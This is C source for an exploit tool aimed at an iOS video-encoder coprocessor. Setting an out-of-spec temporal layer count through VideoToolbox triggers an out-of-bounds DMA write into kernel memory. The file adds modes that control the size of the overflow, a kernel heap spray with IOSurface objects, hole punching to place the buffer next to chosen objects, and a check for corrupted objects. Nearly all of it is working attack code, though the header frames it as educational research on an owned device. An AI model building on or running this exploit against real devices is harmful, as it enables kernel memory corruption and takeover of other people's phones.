/*
 * ave_controlled_oob.c — AVE DMA OOB Write with Controlled Overflow Amount
 *
 * Target: iPhone Duo (A20 Pro), iOS 27.1
 * Purpose: Educational research on owned device — control OOB overflow amount
 *
 * Key insight from kernelcache analysis:
 * - NumberOfTemporalLayers directly affects DPB (Decoded Picture Buffer) allocation
 * - The assertion (iNumOfTemporalLayer - 1) <= 7 fires AFTER CalcSurfaceInfo
 * - CalcSurfaceInfo uses NTL unchecked to compute buffer sizes
 * - The AVE coprocessor writes encoded data for ALL specified layers
 * - Overflow amount = (actual_layers_written × per_layer_size) - allocated_buffer
 *
 * Modes:
 *   safe        — Normal encode, no overflow (NTL=2, within spec)
 *   probe_N     — Set NTL=N (9-100), measure if crash occurs
 *                 Goal: find minimum NTL that causes OOB
 *   controlled  — NTL=16 (small OOB, ~8 extra layers worth of data)
 *   medium      — NTL=32 (moderate OOB)
 *   large       — NTL=16463 (original trigger, massive OOB, guaranteed panic)
 *
 * Pre-crash strategy: Before triggering OOB, spray kernel heap with
 * IOSurface allocations to position target objects adjacent to AVE DMA buffers.
 *
 * Build:
 *   xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
 *     -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
 *     -framework CoreFoundation -framework IOSurface \
 *     -o ave_controlled_oob ave_controlled_oob.c -Wno-deprecated-declarations
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

typedef uint32_t IOSurfaceID;
typedef struct __IOSurface *IOSurfaceRef;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef);
extern void IOSurfaceIncrementUseCount(IOSurfaceRef);

static FILE *out;

static void p(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vfprintf(out, fmt, ap);
    va_end(ap);
    fflush(out);
}

/*
 * Spray IOSurface allocations to shape the kernel heap.
 * Goal: position known objects adjacent to where AVE DMA buffers land.
 *
 * The AVE DMA output buffers are allocated in the kernel zone allocator.
 * By spraying IOSurface objects of specific sizes, we can fill zone pages
 * and force the AVE buffer to be allocated next to our controlled objects.
 */
static IOSurfaceRef *heap_spray(int count, int width, int height) {
    p("[*] Heap spray: %d IOSurfaces %dx%d\n", count, width, height);

    IOSurfaceRef *surfaces = calloc(count, sizeof(IOSurfaceRef));
    if (!surfaces) return NULL;

    CFStringRef keys[] = {
        CFSTR("IOSurfaceWidth"),
        CFSTR("IOSurfaceHeight"),
        CFSTR("IOSurfaceBytesPerElement"),
        CFSTR("IOSurfacePixelFormat"),
    };

    int w = width, h = height, bpe = 4;
    uint32_t fmt = 0x42475241; /* BGRA */
    CFNumberRef vals[] = {
        CFNumberCreate(NULL, kCFNumberIntType, &w),
        CFNumberCreate(NULL, kCFNumberIntType, &h),
        CFNumberCreate(NULL, kCFNumberIntType, &bpe),
        CFNumberCreate(NULL, kCFNumberSInt32Type, &fmt),
    };

    CFDictionaryRef props = CFDictionaryCreate(NULL,
        (const void **)keys, (const void **)vals, 4,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

    int created = 0;
    for (int i = 0; i < count; i++) {
        surfaces[i] = IOSurfaceCreate(props);
        if (surfaces[i]) {
            IOSurfaceIncrementUseCount(surfaces[i]);
            created++;
        }
    }

    p("[+] Created %d/%d IOSurfaces\n", created, count);
    if (created > 0) {
        p("    First ID: %u, AllocSize: %zu\n",
            IOSurfaceGetID(surfaces[0]),
            IOSurfaceGetAllocSize(surfaces[0]));
    }

    for (int i = 0; i < 4; i++) CFRelease(vals[i]);
    CFRelease(props);
    return surfaces;
}

/*
 * Create holes in the heap spray by freeing every Nth surface.
 * This creates predictable gaps where the AVE DMA buffer will land.
 */
static void create_holes(IOSurfaceRef *surfaces, int count, int every_n) {
    p("[*] Creating holes: freeing every %dth surface\n", every_n);
    int freed = 0;
    for (int i = 0; i < count; i += every_n) {
        if (surfaces[i]) {
            CFRelease(surfaces[i]);
            surfaces[i] = NULL;
            freed++;
        }
    }
    p("[+] Freed %d surfaces\n", freed);
}

/*
 * Trigger the AVE encode with specified temporal layer count.
 * Returns 0 on success, negative on error, positive on panic (won't return).
 */
static int trigger_ave(int width, int height, int ntl, int real_time) {
    p("\n[*] AVE trigger: %dx%d HEVC, NTL=%d, RT=%d\n", width, height, ntl, real_time);

    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, width, height, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, NULL, NULL, &session);

    if (st != noErr || !session) {
        p("[-] Session create failed: %d\n", (int)st);
        return -1;
    }

    /* Set encoder properties to match the confirmed trigger */
    CFNumberRef usage = NULL;
    int usage_val = 1;
    usage = CFNumberCreate(NULL, kCFNumberIntType, &usage_val);
    VTSessionSetProperty(session, CFSTR("EncoderUsage"), usage);
    CFRelease(usage);

    int rc_val = 20;
    CFNumberRef rc = CFNumberCreate(NULL, kCFNumberIntType, &rc_val);
    VTSessionSetProperty(session, CFSTR("RCMode"), rc);
    CFRelease(rc);

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime,
        real_time ? kCFBooleanTrue : kCFBooleanFalse);

    /* Set the temporal layer count — this is the OOB trigger */
    CFNumberRef n = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
    st = VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), n);
    CFRelease(n);
    p("[*] NTL=%d set result: %d\n", ntl, (int)st);
    if (st != noErr) {
        p("[-] NTL rejected\n");
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -2;
    }

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        p("[-] Prepare failed: %d\n", (int)st);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -3;
    }

    /* Create pixel buffer and fill with controlled pattern */
    CVPixelBufferRef pb = NULL;
    CVReturn cv = CVPixelBufferCreate(NULL, width, height,
        kCVPixelFormatType_32BGRA, NULL, &pb);
    if (cv != kCVReturnSuccess || !pb) {
        p("[-] PixelBuffer create failed: %d\n", (int)cv);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -4;
    }

    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) {
        size_t sz = CVPixelBufferGetDataSize(pb);
        /* Fill with a recognizable pattern — this influences the encoded output
         * and thus what gets written during the DMA OOB */
        memset(base, 0x41, sz);
    }
    CVPixelBufferUnlockBaseAddress(pb, 0);

    p("[!] Submitting encode frame — OOB will occur in coprocessor DMA\n");

    VTEncodeInfoFlags flags = 0;
    CMTime pts = CMTimeMake(0, 30);
    CMTime dur = CMTimeMake(1, 30);

    st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, &flags);
    p("[+] EncodeFrame returned: %d (flags=0x%x)\n", (int)st, (unsigned)flags);

    /* If we get here, the OOB didn't cause an immediate panic */
    if (st == noErr)
        p("[*] No immediate crash — OOB may have corrupted heap silently\n");

    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    CVPixelBufferRelease(pb);
    return (int)st;
}

int main(int argc, char *argv[]) {
    char path[1024];
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    snprintf(path, sizeof(path), "%s/Documents/ave_controlled.txt", home);
    out = fopen(path, "w");
    if (!out) { out = fopen("/tmp/ave_controlled.txt", "w"); }
    if (!out) return 1;

    const char *mode = (argc >= 2) ? argv[1] : "info";

    p("=== AVE Controlled OOB Research Tool ===\n");
    p("Mode: %s\n", mode);
    p("PID: %d, UID: %d\n\n", getpid(), getuid());

    char buf[256]; size_t len;
    len = sizeof(buf); sysctlbyname("kern.osversion", buf, &len, NULL, 0);
    p("kern.osversion: %s\n", buf);
    len = sizeof(buf); sysctlbyname("hw.machine", buf, &len, NULL, 0);
    p("hw.machine: %s\n\n", buf);

    if (strcmp(mode, "info") == 0) {
        p("Modes: info, safe, probe_N, controlled, medium, large\n");
        p("  safe       — NTL=2, within spec, no overflow\n");
        p("  probe_N    — NTL=N (try 9,10,16,32...), find minimum OOB trigger\n");
        p("  controlled — NTL=16, small overflow (~8 extra layers)\n");
        p("  medium     — NTL=32, moderate overflow\n");
        p("  large      — NTL=16463, guaranteed panic (original trigger)\n");
        p("  heap_spray — Spray IOSurfaces then trigger with NTL=16\n");
    }
    else if (strcmp(mode, "safe") == 0) {
        p("[*] Safe mode: NTL=2 (within 0-7 spec)\n");
        trigger_ave(1280, 720, 2, 0);
    }
    else if (strncmp(mode, "probe_", 6) == 0) {
        int ntl = atoi(mode + 6);
        if (ntl < 1) ntl = 9;
        p("[!] Probe mode: NTL=%d — may panic if overflow triggers\n", ntl);
        trigger_ave(1280, 720, ntl, 0);
    }
    else if (strcmp(mode, "controlled") == 0) {
        p("[!] Controlled mode: NTL=16 — small overflow, may panic\n");
        trigger_ave(1280, 720, 16, 0);
    }
    else if (strcmp(mode, "medium") == 0) {
        p("[!] Medium mode: NTL=32 — moderate overflow, likely panic\n");
        trigger_ave(1280, 720, 32, 0);
    }
    else if (strcmp(mode, "large") == 0) {
        p("[!] Large mode: NTL=16463 — guaranteed panic!\n");
        trigger_ave(1280, 720, 16463, 0);
    }
    else if (strcmp(mode, "heap_spray") == 0) {
        p("[*] Heap spray + controlled OOB mode\n\n");

        /* Phase 1: Spray the kernel heap with IOSurfaces */
        IOSurfaceRef *spray = heap_spray(256, 64, 64);

        /* Phase 2: Create holes for AVE buffer placement */
        if (spray) {
            create_holes(spray, 256, 8);
            usleep(100000); /* Let allocator settle */
        }

        /* Phase 3: Trigger AVE encode with small NTL */
        p("\n[*] Phase 3: Triggering AVE with NTL=16\n");
        trigger_ave(1280, 720, 16, 0);

        /* Phase 4: Check if spray objects are corrupted */
        if (spray) {
            p("\n[*] Phase 4: Checking spray integrity\n");
            int corrupted = 0;
            for (int i = 0; i < 256; i++) {
                if (spray[i]) {
                    IOSurfaceID sid = IOSurfaceGetID(spray[i]);
                    if (sid == 0) corrupted++;
                }
            }
            p("[*] Corrupted surfaces: %d/256\n", corrupted);

            /* Cleanup */
            for (int i = 0; i < 256; i++) {
                if (spray[i]) CFRelease(spray[i]);
            }
            free(spray);
        }
    }
    else {
        p("Unknown mode: %s\n", mode);
    }

    p("\n=== Done ===\n");
    fclose(out);
    return 0;
}
